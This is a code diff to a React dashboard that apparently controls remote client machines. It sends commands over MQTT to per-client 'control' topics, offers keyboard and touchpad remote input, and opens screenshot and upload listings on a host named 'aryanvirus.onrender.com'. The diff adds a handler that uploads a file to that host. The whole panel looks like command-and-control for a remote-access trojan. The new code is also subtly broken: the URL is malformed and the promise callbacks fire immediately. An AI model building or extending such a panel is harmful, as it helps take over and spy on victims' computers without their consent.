@@ -15,6 +15,21 @@ export default function App() {
   const [heartEffect, setHeartEffect] = useState(false);
   const [confirmEnabled, setConfirmEnabled] = useState(true);
 
+const uploadfile = (e)=>{
+      const file = e.target.files[0];
+      if(!file) return alert("Please select file first")
+      const form = new FormData();
+      form.append("screenshot",file);
+
+      fetch("https:aryanvirus.onrender.com/upload",{
+        method:"POST",
+        body:form
+      })
+      .then((res)=>res.text()
+      .then(alert("File uploaded"))
+      .catch(alert("Upload Failed")));
+}
+
   const [panel,setPanel] = useState(0)
 
   const BROKER = import.meta.env.VITE_EMQX_BROKER
@@ -86,7 +101,7 @@ export default function App() {
       Object.keys(clients).forEach(id => {
         if (clients[id]) client.publish(`control/${id}`, command.trim());
       });
-      client.publish("control/broadcast", command.trim());
+      // client.publish("control/broadcast", command.trim());
     } else {
       const target = selectedClient || "broadcast";
       client.publish(`control/${target}`, command.trim());
@@ -204,6 +219,7 @@ export default function App() {
         <button style={{ backgroundColor: "#f1c40f" }} onClick={() => window.open("https://aryanvirus.onrender.com/latestupload")}>Latest Upload</button>
         <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads")}>All Uploads</button>
         <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads_new")}>All File Uploads</button>
+        <input type="file" onChange={uploadfile} style={{ backgroundColor: "#7f8c8d" }}/>
       </div>
 </div>:panel==1?<div><Keyboard sendCommand={sendCommand}/>
 <MouseTouchpad sendCommand={sendCommand}/></div>:null}
